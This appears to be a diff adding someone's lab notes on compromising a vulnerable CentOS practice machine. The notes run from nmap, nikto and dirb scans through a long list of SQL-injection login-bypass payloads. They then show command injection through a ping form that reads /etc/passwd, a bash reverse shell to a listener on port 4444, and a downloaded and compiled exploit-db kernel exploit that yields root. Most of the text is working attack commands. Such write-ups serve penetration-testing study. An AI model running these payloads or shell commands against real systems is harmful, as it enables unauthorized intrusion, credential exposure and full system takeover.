@@ -1,0 +1,192 @@
+################################
+$$Enumeration$$ 
+
+nmap -sV 192.168.230.143 
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-08-19 04:24 EDT
+Nmap scan report for 192.168.230.143
+Host is up (0.00017s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+111/tcp  open  rpcbind  2 (RPC #100000)
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+631/tcp  open  ipp      CUPS 1.1
+666/tcp  open  status   1 (RPC #100024)
+3306/tcp open  mysql    MySQL (unauthorized)
+
+###########################################################################
+
+nikto -h 192.168.230.143
+dirb http://192.168.230.143
+###################################
+Browsing 192.168.230.143
+
+Found that a page accept user & pass From This Site
+$ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20injection#authentication-bypass 
+$ https://gist.github.com/hofmannsven/9164408 ****SQL INJECTION****
+tried an sql injections 
+Authentication bypass
+
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+
+######################################################################################
+
+Then a ping prompt was found, it might be vulnerable to Command Inection 
+
+$ https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/os-cmd-execution ***COMMAND INJECTION|EXECUTION***
+
+Executing Commands
+Various ways of separating Commands:
+blah;blah2
+blah ^ blah 2
+blah && blah2
+FAIL || X
+blah%0Dblah2%0Dblah3
+`blah`
+`blah & blah2`
+
+###################################
+7 continues to the above
+
+; cat /etc/passwd           $$ To get the users 
+Time to get a reverse_shell
+$ nc -lvp 4444
+- & bash -i >& /dev/tcp/192.168.230.128/4444 0>&1
+###################################################
+
+uname -a 
+cat /etc/*-release          $ to get what's running in the machine and its version.
+
+########################################################################################
+
+$ cd /var/tmp
+$ wget https://www.exploit-db.com/download/9542 --no-check-certificate
+$ mv 9542 9542.c
+$ gcc 9542.c -o centos-exploit
+$ ./centos-exploit
+
+bash-3.00$ ./centos-exploit
+sh: no job control in this shell
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+$ id & whoami & enjoy! 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
